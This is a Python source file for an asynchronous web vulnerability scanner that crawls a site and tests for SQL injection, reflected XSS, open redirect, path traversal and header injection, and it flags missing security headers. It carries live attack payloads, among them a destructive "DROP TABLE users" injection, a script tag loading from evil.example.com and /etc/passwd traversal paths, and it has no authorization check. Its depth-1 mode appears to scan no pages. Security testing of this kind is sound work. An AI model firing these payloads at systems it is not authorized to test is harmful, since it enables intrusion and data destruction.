"""Web vulnerability scanner — multi-depth SQLi, XSS, redirect, header injection, security headers."""
import asyncio
import aiohttp
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

# ── Payloads by depth ──────────────────────────────────────────────────────────
SQLI_PAYLOADS = {
    1: ["'"  , "' OR '1'='1", '" OR "1"="1'],
    2: ["'"  , "' OR '1'='1", '" OR "1"="1', "' OR 1=1--", "'; DROP TABLE users--",
        "1' AND SLEEP(2)--", "1; WAITFOR DELAY '0:0:2'--"],
    3: ["'"  , "' OR '1'='1", '" OR "1"="1', "' OR 1=1--", "'; DROP TABLE users--",
        "1' AND SLEEP(2)--", "1; WAITFOR DELAY '0:0:2'--",
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
        "admin'--", "' AND 1=2 UNION SELECT table_name,NULL FROM information_schema.tables--"],
}
XSS_PAYLOADS = {
    1: ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>'],
    2: ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', "';alert(1)//",
        "<svg onload=alert(1)>", 'javascript:alert(1)'],
    3: ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', "';alert(1)//",
        "<svg onload=alert(1)>", 'javascript:alert(1)',
        '"><script src=//evil.example.com></script>',
        '<img src=x:alert(alt) onerror=eval(src)>',
        '`"><svg/onload=alert(1)>'],
}
PATH_TRAVERSAL = [
    "/../../../etc/passwd", "/../../etc/passwd",
    "/../../../windows/win.ini", "/../../windows/win.ini",
    "....//....//etc/passwd",
]
REDIRECT_PARAMS = ["redirect", "url", "next", "return", "returnTo", "goto",
                   "dest", "destination", "redir", "target", "continue", "forward"]
REDIRECT_PAYLOAD = "https://evil.example.com"
HEADER_INJECT_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For", "X-Real-IP", "X-Forwarded-Host"]
SECURITY_HEADERS = [
    ("Strict-Transport-Security", "HSTS missing — susceptible to SSL-stripping"),
    ("Content-Security-Policy",   "CSP missing — XSS risk elevated"),
    ("X-Frame-Options",           "Clickjacking protection missing"),
    ("X-Content-Type-Options",    "MIME-type sniffing not blocked"),
    ("Referrer-Policy",           "Referrer header leakage possible"),
    ("Permissions-Policy",        "Permissions-Policy header absent"),
]
SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-", "syntax error", "unclosed quotation",
    "pg_query", "sqlite3", "you have an error in your sql syntax",
    "warning: mysql", "jdbc", "odbc driver",
]


def inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


def same_origin(base: str, url: str) -> bool:
    b, u = urlparse(base), urlparse(url)
    return b.netloc == u.netloc


class WebScanner:
    def __init__(self, base_url: str, timeout: int = 5, depth: int = 1):
        self.base_url = base_url.rstrip("/")
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.depth = max(1, min(3, depth))
        self.findings = []
        self._visited: set[str] = set()

    # ── HTTP helpers ──────────────────────────────────────────────────────────

    async def _get(self, session, url, **kwargs):
        try:
            async with session.get(url, allow_redirects=False,
                                   timeout=self.timeout, **kwargs) as r:
                return r.status, dict(r.headers), await r.text(errors="ignore")
        except Exception:
            return None, {}, ""

    async def _post(self, session, url, data):
        try:
            async with session.post(url, data=data, allow_redirects=False,
                                    timeout=self.timeout) as r:
                return r.status, await r.text(errors="ignore")
        except Exception:
            return None, ""

    # ── Crawlers ─────────────────────────────────────────────────────────────

    async def _crawl(self, session, url: str, level: int) -> list[str]:
        """Return unique same-origin URLs found on page, up to `level` deep."""
        if url in self._visited or level <= 0:
            return []
        self._visited.add(url)
        _, _, html = await self._get(session, url)
        if not html:
            return [url]
        soup = BeautifulSoup(html, "html.parser")
        found = [url]
        for a in soup.find_all("a", href=True):
            href = urljoin(url, a["href"]).split("#")[0]
            if href not in self._visited and same_origin(self.base_url, href):
                found.extend(await self._crawl(session, href, level - 1))
                if len(found) >= 30:  # cap pages per crawl level
                    break
        return found

    async def _collect_forms(self, session, url: str) -> list[dict]:
        _, _, html = await self._get(session, url)
        if not html:
            return []
        soup = BeautifulSoup(html, "html.parser")
        forms = []
        for form in soup.find_all("form"):
            action = urljoin(url, form.get("action") or "")
            method = (form.get("method") or "get").lower()
            inputs = {
                inp.get("name"): inp.get("value", "test")
                for inp in form.find_all("input") if inp.get("name")
            }
            forms.append({"action": action, "method": method, "inputs": inputs})
        return forms

    async def _url_params(self, session, url: str) -> list[str]:
        _, _, html = await self._get(session, url)
        if not html:
            return []
        soup = BeautifulSoup(html, "html.parser")
        params: set[str] = set()
        for a in soup.find_all("a", href=True):
            pq = parse_qs(urlparse(a["href"]).query)
            params.update(pq.keys())
        return list(params)

    # ── Tests ─────────────────────────────────────────────────────────────────

    def _add(self, type_, severity, location, param, payload, evidence):
        self.findings.append({"type": type_, "severity": severity,
                               "location": location, "parameter": param,
                               "payload": payload, "evidence": evidence})

    async def test_sqli_url(self, session, page_url, param):
        for p in SQLI_PAYLOADS[self.depth]:
            url = inject_param(page_url, param, p)
            _, _, body = await self._get(session, url)
            if any(e in body.lower() for e in SQLI_ERRORS):
                self._add("SQL Injection", "Critical", url, param, p, "SQL error in response")
                return

    async def test_xss_url(self, session, page_url, param):
        for p in XSS_PAYLOADS[self.depth]:
            url = inject_param(page_url, param, p)
            _, _, body = await self._get(session, url)
            if p in body:
                self._add("Reflected XSS", "High", url, param, p, "Payload reflected in response")
                return

    async def test_sqli_form(self, session, form):
        for field in form["inputs"]:
            for p in SQLI_PAYLOADS[self.depth]:
                _, body = await self._post(session, form["action"], {**form["inputs"], field: p})
                if any(e in body.lower() for e in SQLI_ERRORS):
                    self._add("SQL Injection (Form)", "Critical", form["action"], field, p, "SQL error in response")
                    break

    async def test_xss_form(self, session, form):
        for field in form["inputs"]:
            for p in XSS_PAYLOADS[self.depth]:
                _, body = await self._post(session, form["action"], {**form["inputs"], field: p})
                if p in body:
                    self._add("Reflected XSS (Form)", "High", form["action"], field, p, "Payload reflected in response")
                    break

    async def test_open_redirect(self, session, page_url):
        for param in REDIRECT_PARAMS:
            url = inject_param(page_url, param, REDIRECT_PAYLOAD)
            status, headers, _ = await self._get(session, url)
            loc = headers.get("Location", "")
            if status in (301, 302, 303, 307, 308) and REDIRECT_PAYLOAD in loc:
                self._add("Open Redirect", "Medium", url, param, REDIRECT_PAYLOAD, f"Redirects to {loc}")

    async def test_path_traversal(self, session, page_url):
        """Depth 3: probe path traversal on common path segments."""
        parsed = urlparse(page_url)
        base_path = parsed.path.rstrip("/") or ""
        for pt in PATH_TRAVERSAL:
            url = urlunparse(parsed._replace(path=base_path + pt))
            _, _, body = await self._get(session, url)
            if any(k in body for k in ("root:x:", "[fonts]", "/bin/bash")):
                self._add("Path Traversal", "Critical", url, "path", pt, "Sensitive file content in response")
                return

    async def test_header_injection(self, session):
        """Depth 3: inject SQLi/XSS payloads via HTTP headers."""
        p = SQLI_PAYLOADS[3][0]
        for header in HEADER_INJECT_HEADERS:
            _, _, body = await self._get(session, self.base_url, headers={header: p})
            if any(e in body.lower() for e in SQLI_ERRORS):
                self._add("Header Injection (SQLi)", "High", self.base_url, header, p, "SQL error triggered via header")

    async def check_security_headers(self, session):
        """Depth 2+: report missing security headers."""
        _, headers, _ = await self._get(session, self.base_url)
        lower_keys = {k.lower() for k in headers}
        for name, desc in SECURITY_HEADERS:
            if name.lower() not in lower_keys:
                self._add("Missing Security Header", "Low", self.base_url, name, "N/A", desc)

    # ── Orchestration ────────────────────────────────────────────────────────

    async def run(self) -> dict:
        async with aiohttp.ClientSession() as session:
            # Crawl depth: d1=1page, d2=~10 pages (1 level), d3=~30 pages (2 levels)
            crawl_levels = {1: 0, 2: 1, 3: 2}
            self._visited.clear()
            pages = await self._crawl(session, self.base_url, crawl_levels[self.depth])

            tasks = []
            for page in pages:
                params = await self._url_params(session, page)
                forms = await self._collect_forms(session, page)
                for param in params:
                    tasks.append(self.test_sqli_url(session, page, param))
                    tasks.append(self.test_xss_url(session, page, param))
                tasks.append(self.test_open_redirect(session, page))
                for form in forms:
                    tasks.append(self.test_sqli_form(session, form))
                    tasks.append(self.test_xss_form(session, form))
                if self.depth >= 3:
                    tasks.append(self.test_path_traversal(session, page))

            if self.depth >= 2:
                tasks.append(self.check_security_headers(session))
            if self.depth >= 3:
                tasks.append(self.test_header_injection(session))

            await asyncio.gather(*tasks)

        return {"target": self.base_url, "findings": self.findings, "total": len(self.findings)}
